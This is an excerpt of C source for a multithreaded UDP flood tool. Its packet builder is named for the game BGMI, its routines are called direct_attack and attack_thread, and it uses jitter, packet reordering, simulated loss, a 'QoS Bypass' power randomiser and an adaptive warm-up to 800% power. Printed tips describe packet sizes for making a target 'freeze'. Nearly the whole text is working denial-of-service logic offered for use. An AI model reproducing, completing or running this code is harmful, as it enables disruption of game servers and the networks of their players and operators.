...
#define JITTER_RANGE 500
#define RECONNECT_INTERVAL 30000
#define REORDER_CHANCE 3
#define PACKET_LOSS_SIM 2
#define QOS_BYPASS_INTERVAL 25
...
_Atomic int current_power_level = 100;
...
void create_bgmi_packet(char *buf, int size, int thread_id, unsigned int seq, unsigned int *seed, int is_warmup) {
    ...
    if (is_warmup) {
        ...
        for (int i = payload_start; i < dynamic_size; i++) {
            if ((fast_rand(seed) % 100) < 15) buf[i] = 0xFF;
            else if ((fast_rand(seed) % 100) < 10) buf[i] = 0x00;
            else buf[i] = (fast_rand(seed) ^ i ^ thread_id) & 0xFF;
        }
        return;
    }
    
    if ((fast_rand(seed) % 50) == 0) {
        header[0] = 0xFFFFFFFF;
        header[1] = 0xFFFFFFFF;
        int payload_start = 16;
        if (payload_start > dynamic_size) payload_start = dynamic_size;
    ...
    if (should_reorder_packet(seed)) {
        header[1] = htonl(seq - (5 + (fast_rand(seed) % 10)) + thread_id * 100000);
    } else {
        header[1] = htonl(seq + thread_id * 100000);
    }
    
    header[2] = htonl((unsigned int)time(NULL));
    header[3] = 0x00000001 + (seq % 3);
    
    int payload_start = 20;
    if (payload_start > dynamic_size) payload_start = dynamic_size;
    
    for (int i = payload_start; i < dynamic_size; i++) {
        if (i % 7 == 0 && (fast_rand(seed) % 3) == 0) {
            buf[i] = 0x80 + (fast_rand(seed) % 64);
        } else if ((fast_rand(seed) % 100) < 20) {
            buf[i] = 0x00;
        } else if ((fast_rand(seed) % 100) < 10) {
            buf[i] = 0xFF;
        } else {
...
void *direct_attack(void *arg) {
    ...
    int optimal_burst = 300;
    if (PACKET_SIZE <= 48) {
        optimal_burst = 400 + (fast_rand(&seed) % 200);
    } else if (PACKET_SIZE <= 60) {
        optimal_burst = 250 + (fast_rand(&seed) % 150);
    } else {
        optimal_burst = 150 + (fast_rand(&seed) % 100);
    }
    
    unsigned int last_reconnect[FLOOD_SOCKETS];
    for (int i = 0; i < FLOOD_SOCKETS; i++) last_reconnect[i] = 0;
    ...
    while (!atomic_load(&stop_signal)) {
        ...
        int power_level = atomic_load(&current_power_level);
        ...
        for (int i = 0; i < FLOOD_SOCKETS && !atomic_load(&stop_signal); i++) {
            ...
            if (!atomic_load(&warmup_complete)) {
                current_burst = current_burst * 8;
            }
            
            for (int b = 0; b < current_burst && !atomic_load(&stop_signal); b++) {
                if (should_simulate_loss(&seed)) {
                    usleep(get_jitter_delay(&seed));
                    continue;
                }
        ...
        if (!atomic_load(&warmup_complete)) {
            ...
            int sleep_time = 50 + get_jitter_delay(&seed);
            usleep(sleep_time);
        }
    }
...
void *attack_thread(void *arg) {
    ...
    if (PACKET_SIZE <= 48) {
        ...
        packets_per_burst = 80 + (tid % 60);
        sleep_microseconds = 2500;
    } else {
        packets_per_burst = 50 + (tid % 40);
        sleep_microseconds = 3500;
    }
    ...
    while (!atomic_load(&stop_signal)) {
        ...
        if (!atomic_load(&warmup_complete)) {
            ...
            int base_sleep = 10;
            current_sleep = base_sleep + get_jitter_delay(&seed);
...
void *adaptive_controller(void *arg) {
    int warmup_phases[] = {20, 40, 60, 80, 100, 150, 200, 300, 400, 500, 600, 700, 800};
    
    printf("⚡ Adaptive Warm-up: %d seconds (20%% → 800%% power)...\n", WARMUP_SECONDS);
    
    atomic_store(&should_attack, 1);
    
    for (int phase = 0; phase < 13 && !atomic_load(&stop_signal); phase++) {
        atomic_store(&current_power_level, warmup_phases[phase]);
    ...
    if (!atomic_load(&stop_signal)) {
        ...
        atomic_store(&current_power_level, 100);
        __atomic_thread_fence(__ATOMIC_RELEASE);
    ...
    while (!atomic_load(&stop_signal)) {
        ...
        if (qos_counter >= QOS_BYPASS_INTERVAL) {
            int random_power = 70 + (rand() % 60);
            atomic_store(&current_power_level, random_power);
            __atomic_thread_fence(__ATOMIC_RELEASE);
            printf("🔄 QoS Bypass: Adjusting to %d%% power\n", random_power);
            qos_counter = 0;
        ...
        unsigned long long current = atomic_load(&current_pps);
        unsigned long long peak = atomic_load(&peak_pps);
        
        if (current > 0 && peak > 0) {
            int ratio = (int)((current * 100) / peak);
            
            if (ratio < 40) {
                int new_power = atomic_load(&current_power_level) + 20;
                if (new_power > 150) new_power = 150;
                atomic_store(&current_power_level, new_power);
                __atomic_thread_fence(__ATOMIC_RELEASE);
            } else if (ratio > 90) {
                int new_power = atomic_load(&current_power_level) - 10;
                if (new_power < 60) new_power = 60;
                atomic_store(&current_power_level, new_power);
                __atomic_thread_fence(__ATOMIC_RELEASE);
            }
        }
        ...
        if (atomic_load(&should_attack)) {
            ...
            if (!atomic_load(&warmup_complete)) {
                ...
                printf("🔥 PPS: %lluK | Peak: %lluK | %.1fMB | Power: %d%%\n", 
                       pps/1000, atomic_load(&peak_pps)/1000, megabytes, 
                       atomic_load(&current_power_level));
            }
        }
...
int main(int argc, char *argv[]) {
    ...
    printf("📦 Packet Size: %d bytes (44-68)\n", PACKET_SIZE);
    printf("🧵 Threads: %d (100-200)\n", THREAD_COUNT);
    printf("🔧 Features: Jitter+Reorder+LossSim+QoSBypass+Adaptive\n");
    printf("===============================================\n");
    
    if (PACKET_SIZE < 48) {
        printf("💡 Tip: 44-48 bytes for maximum packets\n");
    } else if (PACKET_SIZE < 60) {
        printf("💡 Tip: 52-58 bytes for balanced freeze\n");
    } else if (PACKET_SIZE >= 60) {
        printf("💡 Tip: 64-68 bytes for corruption freeze\n");
    }
    printf("\n");
    ...
    pthread_create(&adaptive_thread, NULL, adaptive_controller, NULL);
